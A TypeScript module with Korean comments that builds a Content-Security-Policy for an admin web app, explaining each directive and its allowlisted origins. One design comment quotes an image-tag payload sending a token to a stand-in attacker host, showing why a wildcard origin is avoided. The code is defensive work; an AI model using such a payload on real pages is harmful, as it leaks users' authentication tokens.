// 관리자 앱의 Content-Security-Policy를 만든다 (next.config.ts의 headers()에서 사용).
//
// 목적: 토큰을 localStorage에 두는 구조(7c-1 결정)에서 XSS의 피해를 줄이는 방어 한 겹.
// 저장소 선택은 XSS 앞에서 큰 차이가 없으므로, 실제 방어는 "서버 문자열은 텍스트로만 렌더링 + dangerouslySetInnerHTML 금지 +
// 서드파티 스크립트는 네이버 지도(공연장 정보 페이지)만 + 이 CSP"의 조합이다.
//
// 한계(알려진 타협): Next.js App Router는 페이지에 인라인 스크립트(flight 데이터)를 심는데, nonce 없이 이를 허용하려면
// script-src에 'unsafe-inline'이 필요하다. 그래서 이 CSP는 **인라인 스크립트 주입 자체는 막지 못한다.**
// 막아 주는 것은 외부 스크립트 로드(script-src 'self'), 외부로의 데이터 전송(connect-src), <form> 탈취(form-action),
// 프레임 삽입(frame-ancestors), <base> 변조(base-uri), 플러그인(object-src)이다.
// nonce 방식(proxy.ts + 동적 렌더링)으로 올리는 안은 7d 이후 재검토 항목이다.

export interface CspOptions {
  /** NEXT_PUBLIC_API_BASE_URL. 이 오리진으로만 fetch를 허용한다 */
  apiBaseUrl?: string;
  /** NEXT_PUBLIC_PUBLIC_SITE_ORIGIN. 팀 카드 미리보기 이미지(공개 사이트 기준 상대경로) 표시에 필요 */
  publicSiteOrigin?: string;
  /**
   * NEXT_PUBLIC_SUPABASE_STORAGE_ORIGIN. 업로드한 팀 카드 이미지(`https://<ref>.supabase.co/...`) 표시에 필요.
   *
   * `https://*.supabase.co` 와일드카드를 쓰지 않는 이유: supabase.co 하위 프로젝트는 누구나 무료로 만들 수 있어
   * 와일드카드는 사실상 "임의의 서버로 이미지 요청을 보내도 된다"가 된다. img-src는 XSS 상황에서
   * `<img src="https://attacker.supabase.co/?=토큰">` 형태의 유출 통로가 되므로 우리 프로젝트 오리진 하나로 좁힌다.
   */
  supabaseStorageOrigin?: string;
  /** 개발 서버는 React Refresh(eval)와 HMR 웹소켓이 필요하다 */
  isDev: boolean;
}

/**
 * 앨범 커버(Apple/iTunes CDN) 오리진.
 *
 * 환경변수로 빼지 않고 상수로 두는 이유는 **서버의 저장 허용 호스트와 같은 값이어야 하기 때문**이다
 * (apps/api의 `ALBUM_COVER_ALLOWED_HOSTS`). 서버가 이 호스트의 주소만 저장하므로 화면이 다른 값을
 * 열어 둘 이유가 없고, 배포 환경마다 달라질 값도 아니다 — 환경변수로 두면 두 값이 갈릴 위험만 생긴다.
 * 서버 allowlist를 넓히는 날 이 상수도 함께 넓힌다.
 */
export const ALBUM_COVER_IMAGE_ORIGIN = "https://is1-ssl.mzstatic.com";

/**
 * 2026-10-25 공개 사이트 /location의 performance.getEntriesByType("resource") 실측:
 * oapi는 SDK·인증 script, nrbe는 JSONP script·지도 타일 img, ssl은 마커·로고·커서 img다.
 * nelo의 connect는 네이버 지도 SDK 로그 수집용이다. 공격자가 응답을 읽을 수 없는 네이버
 * 수집 서버라 유출 통로로서 위험이 낮고, 차단하면 반복되는 위반이 실제 문제를 가린다.
 *
 * 재확인: 관리자 /venue에서 지도 이동·확대 후 콘솔의 Content-Security-Policy 위반을 확인한다.
 * 변경을 승인받으면 위반에 나온 오리진만 추가하고 실측 근거를 이 주석에 남긴다.
 * 클라이언트 측 이동으로 경로별 CSP가 효과가 없어 전역에 넣는 첫 외부 스크립트 예외다.
 * 스크립트를 실제로 로드하는 페이지는 /venue뿐이다.
 */
export const NAVER_MAP_ORIGINS = {
  script: ["https://oapi.map.naver.com", "https://nrbe.pstatic.net"],
  img: ["https://nrbe.pstatic.net", "https://ssl.pstatic.net"],
  connect: ["https://kr-col-ext.nelo.navercorp.com"],
} as const;

/** http(s) URL이면 오리진만 돌려주고, 아니면 undefined. 잘못된 값이 CSP를 깨뜨리거나 넓히지 못하게 한다 */
export function toOrigin(value: string | undefined): string | undefined {
  if (!value) return undefined;
  try {
    const url = new URL(value);
    return url.protocol === "https:" || url.protocol === "http:" ? url.origin : undefined;
  } catch {
    return undefined;
  }
}

export function buildContentSecurityPolicy(options: CspOptions): string {
  const apiOrigin = toOrigin(options.apiBaseUrl);
  const siteOrigin = toOrigin(options.publicSiteOrigin);
  const storageOrigin = toOrigin(options.supabaseStorageOrigin);

  // 이미지 호스트는 화면이 실제로 쓰게 될 때만 추가한다(미리 열어 두지 않는다 — 최소 권한).
  //   7c-2: 팀 카드 — Supabase Storage 오리진. 선택 전 로컬 미리보기가 blob:을 쓴다
  //   7c-3: 앨범 커버 — ALBUM_COVER_IMAGE_ORIGIN
  const imgSrc = [
    "'self'",
    "data:",
    "blob:",
    ALBUM_COVER_IMAGE_ORIGIN,
    ...NAVER_MAP_ORIGINS.img,
    ...(siteOrigin ? [siteOrigin] : []),
    ...(storageOrigin ? [storageOrigin] : []),
  ];
  const connectSrc = [
    "'self'",
    ...(apiOrigin ? [apiOrigin] : []),
    ...(options.isDev ? ["ws://localhost:*"] : []),
    ...NAVER_MAP_ORIGINS.connect,
  ];
  const scriptSrc = ["'self'", "'unsafe-inline'", ...(options.isDev ? ["'unsafe-eval'"] : []), ...NAVER_MAP_ORIGINS.script];

  const directives: string[] = [
    "default-src 'self'",
    `script-src ${scriptSrc.join(" ")}`,
    "style-src 'self' 'unsafe-inline'",
    `img-src ${imgSrc.join(" ")}`,
    "font-src 'self' data:",
    `connect-src ${connectSrc.join(" ")}`,
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ];
  // 개발 서버(http://localhost)에서는 http 리소스가 막혀 오히려 깨지므로 운영 빌드에서만 켠다
  if (!options.isDev) directives.push("upgrade-insecure-requests");

  return directives.join("; ");
}
